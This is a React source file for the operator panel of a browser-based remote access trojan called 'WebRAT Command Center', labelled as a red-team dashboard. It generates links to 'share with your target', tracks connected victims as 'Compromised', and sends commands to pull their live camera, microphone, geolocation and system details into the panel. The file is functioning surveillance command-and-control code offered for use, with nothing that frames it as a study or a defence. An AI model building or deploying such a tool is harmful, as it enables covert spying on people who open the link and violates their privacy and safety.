import { useState, useEffect } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { useWebSocket } from "@/hooks/use-websocket";
import { useToast } from "@/hooks/use-toast";
import { Copy, Users, Activity, Shield, Globe, Eye, Camera, Mic, MapPin, Monitor, Terminal, Link2 } from "lucide-react";
import { useQuery } from "@tanstack/react-query";

interface CommandCenterProps {
  onExit: () => void;
  onViewData: () => void;
}

export function CommandCenter({ onExit, onViewData }: CommandCenterProps) {
  const [activeClients, setActiveClients] = useState<any[]>([]);
  const [selectedClient, setSelectedClient] = useState<string | null>(null);
  const [targetLink, setTargetLink] = useState<string>("");
  const [targetData, setTargetData] = useState<any>({
    camera: null,
    microphone: null,
    location: null,
    systemInfo: null,
    permissions: {}
  });
  const { toast } = useToast();

  const { isConnected, sendMessage } = useWebSocket({
    onMessage: (message) => {
      try {
        if (message.type === 'client_connected' && message.client) {
          setActiveClients(prev => [...prev, message.client]);
          toast({
            title: "New Client Connected",
            description: `Client ${message.client.sessionId || 'unknown'} is now connected`,
          });
        } else if (message.type === 'client_disconnected' && message.sessionId) {
          setActiveClients(prev => prev.filter(client => client.sessionId !== message.sessionId));
          toast({
            title: "Client Disconnected",
            description: `Client ${message.sessionId} has disconnected`,
            variant: "destructive",
          });
        } else if (message.type === 'client_data' && message.sessionId) {
          setActiveClients(prev => prev.map(client => 
            client.sessionId === message.sessionId 
              ? { ...client, ...message.data }
              : client
          ));
          
          // Update target data for selected client
          if (selectedClient === message.sessionId) {
            setTargetData(prev => ({
              ...prev,
              ...message.data
            }));
          }
        } else if (message.type === 'camera_stream' && message.sessionId) {
          if (selectedClient === message.sessionId) {
            setTargetData(prev => ({
              ...prev,
              camera: message.stream
            }));
          }
        } else if (message.type === 'microphone_data' && message.sessionId) {
          if (selectedClient === message.sessionId) {
            setTargetData(prev => ({
              ...prev,
              microphone: message.data
            }));
          }
        } else if (message.type === 'location_data' && message.sessionId) {
          if (selectedClient === message.sessionId) {
            setTargetData(prev => ({
              ...prev,
              location: message.data
            }));
          }
        } else if (message.type === 'system_info_data' && message.sessionId) {
          if (selectedClient === message.sessionId) {
            setTargetData(prev => ({
              ...prev,
              systemInfo: message.data
            }));
          }
        }
      } catch (error) {
        console.error('Error handling WebSocket message:', error);
      }
    },
    onConnect: () => {
      sendMessage({ type: 'register_as_command_center' });
    }
  });

  const { data: serverStatus } = useQuery({
    queryKey: ['/api/status'],
    refetchInterval: 5000,
  });

  const generateTargetLink = () => {
    const baseUrl = window.location.origin;
    const linkId = Math.random().toString(36).substring(2, 15);
    const link = `${baseUrl}/client/${linkId}`;
    setTargetLink(link);
    
    toast({
      title: "Target Link Generated",
      description: "Share this link with your target",
    });
  };

  const copyLinkToClipboard = () => {
    navigator.clipboard.writeText(targetLink);
    toast({
      title: "Link Copied",
      description: "Target link copied to clipboard",
    });
  };

  const sendCommandToClient = (clientId: string, command: string) => {
    console.log('Sending command:', command, 'to client:', clientId);
    sendMessage({
      type: 'command_to_client',
      clientId,
      command
    });
    toast({
      title: "Command Sent",
      description: `${command} command sent to client`,
    });
  };

  const getClientStatus = (client: any) => {
    if (client.consent) return { text: "Compromised", color: "bg-red-500" };
    if (client.isActive) return { text: "Connected", color: "bg-yellow-500" };
    return { text: "Offline", color: "bg-gray-500" };
  };

  return (
    <div className="min-h-screen bg-slate-900 text-slate-100">
      {/* Header */}
      <header className="bg-slate-800 border-b border-slate-700 shadow-lg">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center py-4">
            <div className="flex items-center space-x-4">
              <div className="w-10 h-10 bg-gradient-to-br from-red-500 to-orange-500 rounded-lg flex items-center justify-center">
                <Terminal className="text-lg text-white" />
              </div>
              <div>
                <h1 className="text-xl font-bold text-red-400">WebRAT Command Center</h1>
                <p className="text-sm text-slate-400">Red Team Operations Dashboard</p>
              </div>
            </div>
            <div className="flex items-center space-x-4">
              <div className="flex items-center space-x-2">
                {isConnected ? (
                  <>
                    <div className="w-3 h-3 bg-green-400 rounded-full animate-pulse"></div>
                    <span className="text-sm text-green-400">Command Center Active</span>
                  </>
                ) : (
                  <>
                    <div className="w-3 h-3 bg-red-400 rounded-full"></div>
                    <span className="text-sm text-red-400">Offline</span>
                  </>
                )}
              </div>
              <Button 
                variant="outline" 
                size="sm"
                onClick={onViewData}
                className="border-blue-500 border-opacity-30 text-blue-400 hover:bg-blue-500 hover:bg-opacity-20"
              >
                View Data
              </Button>
              <Button 
                variant="destructive" 
                size="sm"
                onClick={onExit}
                className="bg-red-500 bg-opacity-20 text-red-400 border border-red-500 border-opacity-30 hover:bg-opacity-30"
              >
                Exit
              </Button>
            </div>
          </div>
        </div>
      </header>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Link Generator */}
          <Card className="bg-slate-800 border-slate-600">
            <CardHeader>
              <CardTitle className="text-slate-200 flex items-center">
                <Link2 className="text-cyan-400 mr-2" />
                Target Link Generator
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-4">
                <Button 
                  onClick={generateTargetLink}
                  className="w-full bg-gradient-to-r from-cyan-500 to-blue-500 hover:from-cyan-600 hover:to-blue-600"
                >
                  Generate New Link
                </Button>
                {targetLink && (
                  <div className="space-y-2">
                    <div className="p-3 bg-slate-900 rounded border border-slate-600">
                      <p className="text-xs text-slate-400 mb-1">Target Link:</p>
                      <p className="text-sm text-cyan-400 font-mono break-all">{targetLink}</p>
                    </div>
                    <Button 
                      onClick={copyLinkToClipboard}
                      size="sm"
                      variant="outline"
                      className="w-full"
                    >
                      <Copy className="w-4 h-4 mr-2" />
                      Copy Link
                    </Button>
                  </div>
                )}
              </div>
            </CardContent>
          </Card>

          {/* Server Status */}
          <Card className="bg-slate-800 border-slate-600">
            <CardHeader>
              <CardTitle className="text-slate-200 flex items-center">
                <Activity className="text-green-400 mr-2" />
                Server Status
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-3">
                <div className="flex justify-between">
                  <span className="text-slate-400">Status:</span>
                  <Badge className="bg-green-500 bg-opacity-20 text-green-400">
                    {serverStatus?.server_status || 'running'}
                  </Badge>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-400">Connected Clients:</span>
                  <span className="text-slate-200">{activeClients.length}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-400">Platform:</span>
                  <span className="text-slate-200">WebRAT-Lite</span>
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Quick Actions */}
          <Card className="bg-slate-800 border-slate-600">
            <CardHeader>
              <CardTitle className="text-slate-200 flex items-center">
                <Shield className="text-amber-400 mr-2" />
                Quick Actions
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-2">
                <Button 
                  size="sm" 
                  variant="outline" 
                  className="w-full text-left justify-start"
                  disabled={!selectedClient}
                  onClick={() => selectedClient && sendCommandToClient(selectedClient, 'get_camera')}
                >
                  <Camera className="w-4 h-4 mr-2" />
                  Request Camera
                </Button>
                <Button 
                  size="sm" 
                  variant="outline" 
                  className="w-full text-left justify-start"
                  disabled={!selectedClient}
                  onClick={() => selectedClient && sendCommandToClient(selectedClient, 'get_microphone')}
                >
                  <Mic className="w-4 h-4 mr-2" />
                  Request Microphone
                </Button>
                <Button 
                  size="sm" 
                  variant="outline" 
                  className="w-full text-left justify-start"
                  disabled={!selectedClient}
                  onClick={() => selectedClient && sendCommandToClient(selectedClient, 'get_location')}
                >
                  <MapPin className="w-4 h-4 mr-2" />
                  Request Location
                </Button>
                <Button 
                  size="sm" 
                  variant="outline" 
                  className="w-full text-left justify-start"
                  disabled={!selectedClient}
                  onClick={() => selectedClient && sendCommandToClient(selectedClient, 'get_system_info')}
                >
                  <Monitor className="w-4 h-4 mr-2" />
                  Get System Info
                </Button>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Active Clients and Target Data */}
        <div className="mt-6 grid grid-cols-1 lg:grid-cols-2 gap-6">
          {/* Active Clients */}
          <Card className="bg-slate-800 border-slate-600">
            <CardHeader>
              <CardTitle className="text-slate-200 flex items-center">
                <Users className="text-blue-400 mr-2" />
                Active Clients ({activeClients.length})
              </CardTitle>
            </CardHeader>
            <CardContent>
              {activeClients.length === 0 ? (
                <div className="text-center py-8 text-slate-400">
                  <Globe className="mx-auto mb-4 text-4xl" />
                  <p>No active clients connected</p>
                  <p className="text-sm">Generate a link above and share it with your target</p>
                </div>
              ) : (
                <div className="space-y-4">
                  {activeClients.map((client) => {
                    const status = getClientStatus(client);
                    return (
                      <div 
                        key={client.sessionId}
                        className={`p-4 rounded-lg border cursor-pointer transition-all ${
                          selectedClient === client.sessionId 
                            ? 'border-cyan-400 bg-cyan-400 bg-opacity-10' 
                            : 'border-slate-600 hover:border-slate-500'
                        }`}
                        onClick={() => setSelectedClient(client.sessionId)}
                      >
                        <div className="flex justify-between items-start">
                          <div className="space-y-2">
                            <div className="flex items-center space-x-3">
                              <Badge className={`${status.color} bg-opacity-20`}>
                                {status.text}
                              </Badge>
                              <span className="text-sm text-slate-400">
                                ID: {client.sessionId?.substring(0, 8)}...
                              </span>
                            </div>
                            {client.browserInfo && (
                              <div className="text-xs text-slate-400">
                                <p>Browser: {(() => {
                                  try {
                                    const info = typeof client.browserInfo === 'string' ? JSON.parse(client.browserInfo) : client.browserInfo;
                                    return info.userAgent?.substring(0, 50) || 'Unknown';
                                  } catch {
                                    return 'Unknown';
                                  }
                                })()}...</p>
                                <p>IP: {client.clientIP || 'Unknown'}</p>
                              </div>
                            )}
                          </div>
                          <div className="flex items-center space-x-2">
                            <Button 
                              size="sm" 
                              variant="outline"
                              onClick={(e) => {
                                e.stopPropagation();
                                sendCommandToClient(client.sessionId, 'ping');
                              }}
                            >
                              <Eye className="w-4 h-4" />
                            </Button>
                          </div>
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}
            </CardContent>
          </Card>

          {/* Target Data */}
          <Card className="bg-slate-800 border-slate-600">
            <CardHeader>
              <CardTitle className="text-slate-200 flex items-center">
                <Monitor className="text-red-400 mr-2" />
                Target Data
              </CardTitle>
            </CardHeader>
            <CardContent>
              {!selectedClient ? (
                <div className="text-center py-8 text-slate-400">
                  <Monitor className="mx-auto mb-4 text-4xl" />
                  <p>Select a client to view target data</p>
                </div>
              ) : (
                <div className="space-y-4">
                  {/* Camera Feed */}
                  {targetData.camera && (
                    <div className="bg-slate-900 rounded-lg p-4">
                      <h4 className="text-red-400 font-medium mb-2 flex items-center">
                        <Camera className="w-4 h-4 mr-2" />
                        Live Camera Feed
                      </h4>
                      <div className="bg-black rounded aspect-video flex items-center justify-center">
                        <video 
                          ref={(video) => {
                            if (video && targetData.camera) {
                              video.srcObject = targetData.camera;
                            }
                          }}
                          autoPlay 
                          muted 
                          className="w-full h-full object-cover rounded"
                        />
                      </div>
                    </div>
                  )}

                  {/* Microphone Data */}
                  {targetData.microphone && (
                    <div className="bg-slate-900 rounded-lg p-4">
                      <h4 className="text-red-400 font-medium mb-2 flex items-center">
                        <Mic className="w-4 h-4 mr-2" />
                        Microphone Access
                      </h4>
                      <div className="flex items-center space-x-4">
                        <div className="w-4 h-4 bg-green-400 rounded-full animate-pulse"></div>
                        <span className="text-green-400 text-sm">Audio stream active</span>
                      </div>
                    </div>
                  )}

                  {/* Location Data */}
                  {targetData.location && (
                    <div className="bg-slate-900 rounded-lg p-4">
                      <h4 className="text-red-400 font-medium mb-2 flex items-center">
                        <MapPin className="w-4 h-4 mr-2" />
                        Location Data
                      </h4>
                      <div className="space-y-1 text-sm">
                        <p><span className="text-slate-400">Latitude:</span> {targetData.location.latitude}</p>
                        <p><span className="text-slate-400">Longitude:</span> {targetData.location.longitude}</p>
                        <p><span className="text-slate-400">Accuracy:</span> {targetData.location.accuracy}m</p>
                      </div>
                    </div>
                  )}

                  {/* Permission Status */}
                  <div className="bg-slate-900 rounded-lg p-4">
                    <h4 className="text-red-400 font-medium mb-2 flex items-center">
                      <Shield className="w-4 h-4 mr-2" />
                      Permission Status
                    </h4>
                    <div className="space-y-2">
                      {Object.entries(targetData.permissions).map(([permission, granted]) => (
                        <div key={permission} className="flex items-center space-x-2">
                          <div className={`w-3 h-3 rounded-full ${granted ? 'bg-green-400' : 'bg-red-400'}`}></div>
                          <span className="text-sm text-slate-400 capitalize">{permission}</span>
                          <Badge className={`${granted ? 'bg-green-500' : 'bg-red-500'} bg-opacity-20 text-xs`}>
                            {granted ? 'Granted' : 'Denied'}
                          </Badge>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              )}
            </CardContent>
          </Card>
        </div>

        {/* System Information */}
        {selectedClient && targetData.systemInfo && (
          <div className="mt-6">
            <Card className="bg-slate-800 border-slate-600">
              <CardHeader>
                <CardTitle className="text-slate-200 flex items-center">
                  <Monitor className="text-green-400 mr-2" />
                  System Information
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                  <div className="bg-slate-900 rounded-lg p-4">
                    <h4 className="text-green-400 font-medium mb-2">Browser Details</h4>
                    <div className="space-y-1 text-sm">
                      <p><span className="text-slate-400">User Agent:</span></p>
                      <p className="text-slate-300 text-xs break-all">{targetData.systemInfo.userAgent}</p>
                      <p><span className="text-slate-400">Platform:</span> {targetData.systemInfo.platform}</p>
                      <p><span className="text-slate-400">Language:</span> {targetData.systemInfo.language}</p>
                    </div>
                  </div>
                  
                  <div className="bg-slate-900 rounded-lg p-4">
                    <h4 className="text-green-400 font-medium mb-2">Display Information</h4>
                    <div className="space-y-1 text-sm">
                      <p><span className="text-slate-400">Screen Resolution:</span> {targetData.systemInfo.screenWidth}x{targetData.systemInfo.screenHeight}</p>
                      <p><span className="text-slate-400">Color Depth:</span> {targetData.systemInfo.colorDepth}-bit</p>
                      <p><span className="text-slate-400">Timezone:</span> {targetData.systemInfo.timezone}</p>
                    </div>
                  </div>
                  
                  <div className="bg-slate-900 rounded-lg p-4">
                    <h4 className="text-green-400 font-medium mb-2">Capabilities</h4>
                    <div className="space-y-1 text-sm">
                      <p><span className="text-slate-400">HTTPS:</span> {targetData.systemInfo.isHttps ? 'Yes' : 'No'}</p>
                      <p><span className="text-slate-400">Cookies:</span> {targetData.systemInfo.cookieEnabled ? 'Enabled' : 'Disabled'}</p>
                      <p><span className="text-slate-400">Online:</span> {targetData.systemInfo.onLine ? 'Yes' : 'No'}</p>
                      <p><span className="text-slate-400">WebRTC:</span> {targetData.systemInfo.webRTC ? 'Available' : 'Not Available'}</p>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        )}
      </div>
    </div>
  );
}